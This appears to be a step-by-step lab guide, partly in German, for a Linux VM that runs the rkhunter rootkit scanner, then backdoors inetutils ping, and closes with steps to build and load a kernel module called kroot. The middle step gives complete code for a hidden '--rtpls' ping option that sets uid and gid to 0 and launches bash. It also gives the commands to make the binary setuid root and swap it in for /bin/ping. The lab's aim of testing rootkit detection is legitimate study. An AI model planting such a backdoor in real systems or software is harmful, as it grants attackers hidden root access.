# Step 0 Prepare Kernel/VM

Downgrade Kernel via script
Reboot/Start with lower Kernel [Press ESC for selection]
Gasterweiterung installieren (sudo apt-get install virtualbox-guest-addition-iso)
Install vim
To the ~/.vimrc add 
    set mouse=a


# Setp 1 Install and Run rkhunter

Install RootkitHunter (rkhunter) with Local Mail
Update rkhunter DB : sudo rkhunter --update
Scan : sudo rkhunter -c
Copy log from /var/log/rkhunter.log to some safe place (e.g. cp /var/log/rkhunter.log ~/step1.log)

# Step 2 Build/Install Rootkit

#
#ping is found in APT-Sources: http://de.archive.ubuntu.com/ubuntu/ xenial universe
#in /etc/apt/source.list uncomment/add 
    deb-src  http://de.archive.ubuntu.com/ubuntu/ xenial universe
    
#refresh apt database
    sudo apt-get update

#cd into a new/empty dir for downloading the ping src into
# e.g. mkdir -p ~/Documents/Pingdoor && cd ~/Documents/Pingdoor

#get ping source 
    apt-get source inetutils-ping
#install build dependencies 
    sudo apt-get build-dep inetutils-ping
#test-compile while being in the inetutils-1.9.4 folder, this should succeed, this takes some time
# build may complain about missing keys this is not a problem just ignore it
    dpkg-buildpackage

#edit ping/ping.c
#add to the end of the unnamed? enum:

ARG_ROOT_PLS

#add to the argp_options array the following element between #define GRP 10 and #undef GRP,
#must be after {NULL, 0, NULL, 0, "Options controlling ICMP request types:", GRP}:
    {"rtpls",ARG_ROOT_PLS,NULL,OPTION_HIDDEN,"grants root shell",GRP+1},
    
#in the parse_opt method add to the switch 
  
case ARG_ROOT_PLS:
    setuid(0);
    setgid(0);
    execl("/bin/bash",NULL);
    break;

#commit changes 
    dpkg-source --commit
#build changes 
    dpkg-buildpackage

# the next two might be necessary because the first dpkg-buildpackage usually finds changed files.?
#commit changes 
    dpkg-source --commit
#build changes 
    dpkg-buildpackage

#to test first set correct privileges with
    sudo chown root:root ping/ping
    sudo chmod u+s ping/ping
#run ping with special flag
    ping --rtpls

#replace /bin/ping with our ping command
    sudo cp ping/ping /bin/ping
#make sure it hase the setuid bit set
    sudo chmod u+s /bin/ping

#run rkhunter again
    sudo rkhunter -c

# Step 3 Rootkit

#install headers
    sudo apt-get install linux-headers-$(uname -r)

#setup files (can be found in the step3 folder)
#Create Makefile (no quotes around kroot.o)
#Create kroot.c 

#compile (compile.sh)
    make -C /lib/modules/$(uname -r)/build M=$PWD modules

#load (load.sh)
    insmod kroot.ko

#unload (unload.sh)
    rmmod kroot.ko

#Show Messages (add -w to display messages as they come in) (show.sh uses -w flag)
    dmesg -k

#To Recompile and (re)load the module you can use the replace.sh skript


